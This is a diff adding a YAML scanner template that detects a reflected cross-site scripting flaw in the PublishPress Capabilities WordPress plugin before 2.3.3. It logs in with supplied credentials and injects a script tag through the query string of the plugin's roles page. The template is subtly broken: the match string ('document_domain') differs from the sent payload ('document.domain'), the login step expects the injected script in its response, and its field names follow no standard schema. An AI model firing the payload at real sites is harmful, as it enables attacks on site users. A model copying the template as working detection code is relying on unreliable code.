@@ -1,0 +1,53 @@
+id: wp-publishpress-capabilities-xss
+brief:
+    title: PublishPress Capabilities < 2.3.3 - Cross-Site Scripting
+    by: ritikchaddha
+    level: medium
+    about: The PublishPress Capabilities plugin for WordPress before 2.3.3 does not escape a form action URL before outputting it back in an attribute, leading to Reflected Cross-Site Scripting (XSS).
+    label:
+        - xss
+        - wordpress
+        - wp-plugin
+        - wp
+        - capability-manager-enhanced
+        - authenticated
+        - vuln
+    score: CVSS:6.1
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-login.php?redirect_to=http%3A%2F%2F{{Hostname}}%2Fwp-admin%2Foptions-general.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: log={{username}}&pwd={{password}}&wp-submit=Log+In
+      signs:
+        - "on": word
+          has:
+            - <script>alert(document_domain)</script>
+          in: body_2
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-admin/admin.php?page=pp-capabilities-roles&a%22%3E%3Cscript%3Ealert("document.domain")%3C/script%3E'
+      signs:
+        - "on": word
+          has:
+            - <script>alert(document_domain)</script>
+          in: body_2
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
